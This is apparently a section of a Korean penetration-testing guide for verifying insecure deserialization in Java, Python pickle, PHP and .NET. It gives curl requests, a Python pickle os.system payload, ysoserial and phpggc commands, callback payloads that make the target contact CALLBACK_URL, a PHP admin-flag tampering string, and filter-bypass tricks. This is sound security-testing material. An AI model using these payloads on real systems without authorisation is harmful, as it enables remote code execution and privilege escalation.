### Phase 2: 동적 테스트 (검증)


**사전 준비: 직렬화 형식 식별**

대상 엔드포인트의 요청/응답에서 직렬화 형식을 먼저 식별한다:

| 언어 | 직렬화 시그니처 | 발견 위치 |
|------|----------------|-----------|
| Java | `rO0AB` (Base64), `ac ed 00 05` (Hex) | Cookie, 요청 본문, ViewState |
| Python (pickle) | `gASV` (Base64), `\x80\x04\x95` (Hex) | 요청 본문, Redis 세션 |
| PHP | `a:2:{s:`, `O:4:"User"` | Cookie, 세션 파일 |
| .NET | `AAEAAAD` (Base64), ViewState `__VIEWSTATE` | Cookie, 폼 히든 필드 |
| Ruby (Marshal) | `\x04\x08` (Hex) | Cookie, 세션 |

```
# 시그니처 탐지: 쿠키 값을 Base64 디코딩하여 확인
echo "rO0ABXNy..." | base64 -d | xxd | head -5
```

---

**Java 역직렬화 테스트**

Step 1: 직렬화 데이터 존재 확인
```
# 쿠키 또는 파라미터에서 Base64 인코딩된 Java 직렬화 데이터 탐지
curl -v "https://target.com/api/endpoint" \
  -H "Cookie: session=SESSION_COOKIE" 2>&1 | grep -i "rO0AB\|\.ser\|application/x-java-serialized"
```

Step 2: 시간 기반 테스트 (안전)
```
# ysoserial로 sleep 페이로드 생성 (로컬 실행)
# 프로젝트 의존성에서 gadget chain 식별 (Commons Collections, Spring, etc.)
# java -jar ysoserial.jar CommonsCollections1 "sleep 5" | base64 -w0

# 생성된 Base64 페이로드를 원래 직렬화 데이터 위치에 삽입
curl -w "\ntime_total: %{time_total}\n" \
  -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/x-java-serialized-object" \
  -H "Cookie: session=SESSION_COOKIE" \
  --data-binary @payload.ser
```

Step 3: 콜백 기반 테스트 (외부 서비스 필요)
```
# DNS 콜백 페이로드 (URLDNS chain — 의존성 불필요)
# java -jar ysoserial.jar URLDNS "https://CALLBACK_URL/deser-test" | base64 -w0

curl -X POST "https://target.com/api/endpoint" \
  -H "Cookie: session=SESSION_COOKIE" \
  -d "data=BASE64_PAYLOAD"
```

Step 4: 에러 기반 확인
```
# 잘못된 직렬화 데이터로 에러 메시지 유발
curl -X POST "https://target.com/api/endpoint" \
  -H "Cookie: session=SESSION_COOKIE" \
  -d "data=rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlcg=="
```

---

**Python pickle 역직렬화 테스트**

```
# 시간 기반 pickle 페이로드 생성 (로컬 Python 실행)
python3 -c "
import pickle, base64
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('sleep 5',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"

# 생성된 페이로드를 대상 엔드포인트에 전송
curl -w "\ntime_total: %{time_total}\n" \
  -X POST "https://target.com/api/endpoint" \
  -H "Content-Type: application/octet-stream" \
  -H "Cookie: session=SESSION_COOKIE" \
  -d "BASE64_PICKLE_PAYLOAD"
```

콜백 기반:
```
python3 -c "
import pickle, base64
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('curl https://CALLBACK_URL/pickle-test',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
"
```

---

**PHP 역직렬화 테스트**

```
# PHP 직렬화 문자열 변조: 클래스 속성 변경
# 원본: O:4:"User":2:{s:4:"name";s:4:"test";s:5:"admin";b:0;}
# 변조: O:4:"User":2:{s:4:"name";s:4:"test";s:5:"admin";b:1;}

curl -X POST "https://target.com/api/endpoint" \
  -H "Cookie: session=SESSION_COOKIE" \
  -d 'data=O:4:"User":2:{s:4:"name";s:4:"test";s:5:"admin";b:1;}'

# POP chain 테스트 (Monolog, Guzzle, Laravel 등)
# phpggc로 페이로드 생성:
# phpggc Monolog/RCE1 system "id" | base64 -w0
```

---

**.NET 역직렬화 테스트**

```
# ViewState 변조 테스트 (MAC 비활성화 또는 키 노출 시)
# ysoserial.net으로 페이로드 생성:
# ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping CALLBACK_URL"

curl -X POST "https://target.com/page.aspx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "__VIEWSTATE=MALICIOUS_BASE64&__VIEWSTATEGENERATOR=..."
```

---

**응답 분석 기준**

| 응답 유형 | 판단 |
|-----------|------|
| 5초+ 응답 지연 (기준선 대비, 3회 반복 일관) | 확인됨 (시간 기반) |
| 콜백 서비스에서 DNS/HTTP 요청 수신 | 확인됨 (콜백 기반) |
| `ClassNotFoundException`, `UnpicklingError`, `unserialize()` 에러 | 후보 (역직렬화 발생 확인, 코드 실행은 미확인) |
| `InvalidClassException` + 허용 클래스 목록 언급 | 안전 (화이트리스트 적용) |
| 400/500 + 일반 에러 메시지 (기술 세부사항 없음) | 판단 불가 → 다른 페이로드 시도 |
| 정상 응답 (변조 무시) | 안전 (검증/무시 처리) |

**우회 기법:**
- Java: 다양한 gadget chain 시도 (CommonsCollections1~7, Spring, Hibernate, JRMPClient)
- 필터 우회: 직렬화 데이터를 Gzip 압축 후 Base64, 또는 HEX 인코딩으로 전송
- 헤더 변형: `Content-Type: application/octet-stream`으로도 시도
- PHP: `phar://` 프로토콜을 통한 간접 역직렬화 (`phar://uploaded.phar/test.txt`)

**검증 기준:**
- **확인됨**: 동적 테스트로 변조된 직렬화 데이터로 코드 실행(시간 지연, 콜백 수신)이 확인됨
